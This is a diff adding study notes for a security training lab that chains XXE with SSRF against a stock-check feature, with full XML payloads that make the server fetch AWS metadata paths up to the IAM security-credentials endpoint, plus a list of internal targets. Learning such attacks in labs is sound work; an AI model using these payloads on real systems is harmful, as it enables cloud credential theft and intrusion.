@@ -983,3 +983,491 @@ restricted filesystem access
 # 🎯 One-Line Summary
 
 XXE occurs when attacker-controlled XML is parsed unsafely, allowing external entities to read server files or access internal systems.
+
+---
+
+# 🧠Lab-2 (XXE + SSRF + Cloud Metadata Theft)
+
+---
+
+## 📝 Overview
+
+This lab combines:
+
+XXE + SSRF + Cloud Metadata Theft
+
+Goal:
+
+Use XXE to force server to access AWS EC2 metadata service
+and steal IAM secret key.
+
+This is VERY realistic.
+
+Real companies get hacked exactly like this.
+
+---
+
+## 🌐 First Understand EC2 Metadata
+
+Before lab, understand this concept first.
+
+---
+
+## ☁️ What Is EC2?
+
+EC2 is Amazon AWS cloud server.
+
+Basically:
+
+Virtual machine running in AWS cloud
+
+---
+
+## 📡 What Is Metadata Service?
+
+AWS gives every EC2 server a special internal endpoint:
+
+```txt
+http://169.254.169.254
+```
+
+This endpoint contains:
+
+server information
+
+IAM credentials
+
+tokens
+
+config
+
+networking data
+
+---
+
+## ⚠️ Important
+
+This endpoint is:
+
+ONLY accessible from INSIDE the server itself
+
+External attackers normally cannot access it.
+
+---
+
+## 🏢 Real-Life Analogy
+
+Imagine secret employee room inside office.
+
+Outside people:
+
+❌ cannot enter
+
+Employees inside building:
+
+✅ can access
+
+Server = employee.
+
+Attacker tricks server into entering room.
+
+---
+
+## 💥 Why This Is Dangerous
+
+Sometimes metadata contains:
+
+AWS access keys
+
+If attacker steals them:
+
+access cloud resources
+
+dump databases
+
+destroy infrastructure
+
+create admin accounts
+
+Very critical.
+
+---
+
+## 🔄 Core Attack Flow
+
+```txt
+Attacker
+   ↓
+Malicious XML
+   ↓
+XML Parser
+   ↓
+Server requests metadata endpoint
+   ↓
+Secrets returned
+```
+
+---
+
+## 🧭 Lab Walkthrough
+
+---
+
+### 🔎 Step 1 — Open Product
+
+Visit any product page.
+
+Click:
+
+```txt
+Check stock
+```
+
+---
+
+### 📥 Step 2 — Intercept Request
+
+Capture request in Burp.
+
+Original XML:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<stockCheck>
+   <productId>1</productId>
+</stockCheck>
+```
+
+---
+
+### 🧪 Step 3 — Add External Entity
+
+Add this between:
+
+XML declaration
+
+stockCheck tag
+
+```xml
+<!DOCTYPE test [
+   <!ENTITY xxe SYSTEM "http://169.254.169.254/">
+]>
+```
+
+---
+
+### 🧬 Step 4 — Use Entity
+
+Replace:
+
+```xml
+<productId>1</productId>
+```
+
+with:
+
+```xml
+<productId>&xxe;</productId>
+```
+
+---
+
+## 🚀 Final Payload
+
+![Final XXE URL Payload](../images/final-xxe-metadata-url.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE test [
+   <!ENTITY xxe SYSTEM "http://169.254.169.254/">
+]>
+
+<stockCheck>
+   <productId>&xxe;</productId>
+</stockCheck>
+```
+
+---
+
+## ⚙️ What Happens Internally
+
+Parser sees:
+
+```txt
+SYSTEM "http://169.254.169.254/"
+```
+
+Parser thinks:
+
+```txt
+"Oh, I should fetch this URL"
+```
+
+---
+
+## 🌍 Server Sends Request
+
+Important:
+
+SERVER sends request
+NOT your browser
+
+This is SSRF.
+
+---
+
+## 📂 Response Appears
+
+You get something like:
+
+```txt
+latest
+```
+
+or folder names.
+
+---
+
+## 📁 Why Folder Names?
+
+Metadata endpoint behaves like filesystem/directories.
+
+You must explore step-by-step.
+
+---
+
+## 🧠 Important Concept — Enumeration
+
+You now:
+
+browse internal metadata endpoint like folders
+
+---
+
+### 🔄 Step 5 — Explore Metadata Paths
+
+Update payload URL repeatedly.
+
+---
+
+### 📍 First
+
+```txt
+http://169.254.169.254/
+```
+
+Response:
+
+```txt
+latest
+```
+
+---
+
+### 📍 Next
+
+```txt
+http://169.254.169.254/latest/
+```
+
+May show:
+
+```txt
+meta-data
+```
+
+---
+
+### 📍 Next
+
+```txt
+http://169.254.169.254/latest/meta-data/
+```
+
+May show many directories:
+
+```txt
+hostname
+iam
+public-ipv4
+etc
+```
+
+---
+
+## 🎯 Important Target
+
+Eventually reach:
+
+```txt
+http://169.254.169.254/latest/meta-data/iam/
+```
+
+Then:
+
+```txt
+security-credentials/
+```
+
+Then:
+
+```txt
+admin
+```
+
+---
+
+## 🔥 Final URL
+
+```txt
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+```
+
+---
+
+## 🚨 Final Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE test [
+   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
+]>
+
+<stockCheck>
+   <productId>&xxe;</productId>
+</stockCheck>
+```
+
+---
+
+## 📤 Final Response
+
+Returns JSON:
+
+```json
+{
+  "AccessKeyId":"...",
+  "SecretAccessKey":"...",
+  "Token":"..."
+}
+```
+
+---
+
+## ✅ Lab Solved
+
+You copy:
+
+```txt
+SecretAccessKey
+```
+
+---
+
+## 🧠 Understanding The Important Concept
+
+This lab is NOT about reading files.
+
+This lab is about:
+
+forcing server to access INTERNAL CLOUD SERVICES
+
+Huge difference.
+
+---
+
+## 🌐 Why 169.254.169.254?
+
+Special IP reserved for:
+
+link-local services
+
+cloud metadata services
+
+AWS uses it heavily.
+
+---
+
+## 🚫 Why Attacker Cannot Access Directly
+
+From internet:
+
+❌ blocked
+
+From vulnerable server:
+
+✅ accessible
+
+---
+
+## 🌍 Real Attack Scenario
+
+Real companies accidentally expose:
+
+AWS IAM keys
+
+Azure tokens
+
+GCP metadata
+
+via:
+
+XXE
+
+SSRF
+
+open redirects
+
+image fetchers
+
+---
+
+## 🧠 Important Mental Model
+
+```txt
+XXE SSRF turns XML parser into:
+- internal browser
+- internal API client
+- cloud credential thief
+```
+
+---
+
+## 🎯 High Value Targets
+
+```txt
+Target                     Why Important
+
+169.254.169.254           Cloud credentials
+localhost/admin           Internal admin panels
+Internal APIs             Hidden services
+Kubernetes APIs           Cluster compromise
+Redis/Mongo               Database access
+```
+
+---
+
+## 💣 Real-World Impact
+
+Stealing IAM keys may allow:
+
+S3 bucket access
+
+database dumps
+
+cloud takeover
+
+crypto mining
+
+ransomware deployment
+
+Very severe.
+
+---
+
+## 🧠 One-Line Summary
+
+XXE SSRF abuses the XML parser to make the server access internal cloud metadata services and leak sensitive credentials.
